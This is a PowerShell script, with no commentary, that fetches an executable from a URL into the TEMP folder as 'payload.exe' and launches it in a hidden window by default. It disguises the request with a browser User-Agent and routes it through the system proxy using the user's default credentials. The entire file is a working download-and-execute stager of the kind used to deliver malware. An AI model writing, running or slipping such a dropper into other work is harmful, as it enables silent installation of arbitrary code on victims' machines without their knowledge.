param(
    [string]$URL = "http://example.com/file.exe",
    [string]$OutputPath = "$env:TEMP\payload.exe",
    [switch]$RunSilent = $true
)

function Get-RemoteExe {
    param (
        [string]$URL,
        [string]$OutFile,
        [bool]$Silent
    )
    
    try {
        # Create WebClient with improved timeout and security
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
        $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
        
        # Download file
        Write-Output "Downloading payload..."
        $webClient.DownloadFile($URL, $OutFile)
        
        # Verify file exists
        if (!(Test-Path $OutFile)) {
            throw "Download failed: File not found"
        }
        
        # Execute file
        if ($Silent) {
            Start-Process -FilePath $OutFile -WindowStyle Hidden
        } else {
            Start-Process -FilePath $OutFile
        }
        
        Write-Output "Execution completed"
        
    } catch {
        Write-Warning "Operation failed: $_"
    } finally {
        if ($webClient) {
            $webClient.Dispose()
        }
    }
}

# Execute the download and run
Get-RemoteExe -URL $URL -OutFile $OutputPath -Silent $RunSilent
